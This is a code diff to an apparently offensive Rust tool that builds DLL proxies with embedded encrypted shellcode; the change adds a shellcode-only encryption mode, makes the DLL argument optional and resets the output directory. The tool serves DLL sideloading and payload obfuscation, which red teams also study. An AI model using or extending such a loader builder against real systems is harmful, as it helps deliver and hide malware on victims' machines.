@@ -20,7 +20,7 @@ struct EncArgs {
 #[command(author, version, about, long_about = None)]
 struct Args {
     #[arg(short, long)]
-    pub dll: std::path::PathBuf,
+    pub dll: Option<std::path::PathBuf>,
     #[arg(short, long)]
     pub shellcode: Option<std::path::PathBuf>,
     #[arg(short, long)]
@@ -91,7 +91,6 @@ fn get_encryption_algo(
 
 fn main() -> std::io::Result<()> {
     let args = Args::parse();
-    println!("Proxying {:?}", args.dll);
 
     let mut shellcode = match &args.shellcode {
         Some(shellcode_path) => {
@@ -107,9 +106,44 @@ fn main() -> std::io::Result<()> {
     let mut output = args.output.unwrap_or_else(|| std::path::PathBuf::from("output"));
     let mut asset_path = args.resources.unwrap_or_else(|| std::path::PathBuf::from("assets"));
 
-    let dll_data = fs::read(&args.dll).expect("Could not read dll file");
+    // Remove output directory if it exists, then create a fresh one
+    if output.exists() {
+        fs::remove_dir_all(&output)?;
+    }
+    fs::create_dir(&output)?;
 
-    let dll_name = args.dll.file_stem().unwrap().to_str().unwrap();
+    // If no DLL was specified, just encrypt and output the shellcode
+    if args.dll.is_none() {
+        if shellcode.is_empty() {
+            eprintln!("Error: No shellcode provided. Use --shellcode to specify a shellcode file.");
+            std::process::exit(1);
+        }
+        println!("No DLL specified - encrypting shellcode only");
+
+        let encryption_algo = get_encryption_algo(&args.encryption, &mut shellcode, &mut asset_path)?;
+        let shellcode_template = load_asset_file(&mut asset_path, "shellcode_template.rs")?;
+        let shellcode_str = join_vec(&shellcode, ",");
+
+        let shellcode_output = shellcode_template
+            .replace("{SIZE}", &shellcode.len().to_string())
+            .replace("{SHELLCODE}", &shellcode_str);
+
+        write_output_file(&mut output, "shellcode.rs", shellcode_output.as_bytes())?;
+
+        let shellcode_stub_template = load_asset_file(&mut asset_path, "shellcode_stub.rs")?;
+        let shellcode_stub = shellcode_stub_template.replace("{ENC}", &encryption_algo);
+        write_output_file(&mut output, "shellcode_stub.rs", shellcode_stub.as_bytes())?;
+
+        println!("Shellcode encryption complete!");
+        return Ok(());
+    }
+
+    // Full DLL proxy generation
+    let dll_path = args.dll.as_ref().unwrap();
+    println!("Proxying {:?}", dll_path);
+
+    let dll_data = fs::read(&dll_path).expect("Could not read dll file");
+    let dll_name = dll_path.file_stem().unwrap().to_str().unwrap();
 
     let pe_file = winpe::parse(dll_data);
     if pe_file.is_x64() {
@@ -140,8 +174,6 @@ fn main() -> std::io::Result<()> {
     let export_asm = export_asm_template.replace("{}", function_exports.as_str());
 
     let template_content = load_asset_file(&mut asset_path, "template.rs")?;
-
-    fs::create_dir(&output)?;
 
     let mut shellcode_stub_template = String::new();
     if !shellcode.is_empty() {
